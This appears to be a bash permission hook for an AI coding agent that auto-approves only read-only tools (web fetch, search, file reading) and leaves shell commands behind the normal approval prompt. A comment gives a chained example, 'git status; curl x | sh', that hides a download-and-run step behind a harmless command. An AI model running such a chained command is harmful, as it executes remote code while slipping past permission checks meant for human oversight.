#!/usr/bin/env bash
# yolo-random PreToolUse hook.
# Auto-approves only NON-INVASIVE, read-only tools (web access + code reading)
# so passive runs don't prompt for them. No jq dependency: matches the fixed
# tool-name allowlist with grep.
#
# Deliberately does NOT touch Bash. Outward/destructive shell actions (git push,
# gh pr create, rm, etc.) stay gated behind the normal permission prompt --
# auto-approving arbitrary shell by parsing command strings is unsafe (command
# chaining like `git status; curl x | sh` defeats any prefix allowlist), so the
# user opts into those once via --dangerously-skip-permissions or their own
# settings allowlist.
input=$(cat)
if printf '%s' "$input" | grep -qE '"tool_name"[[:space:]]*:[[:space:]]*"(WebFetch|WebSearch|Read|Grep|Glob)"'; then
  printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"yolo-random: non-invasive read-only tool"}}\n'
fi
# No match -> no output -> normal permission flow.
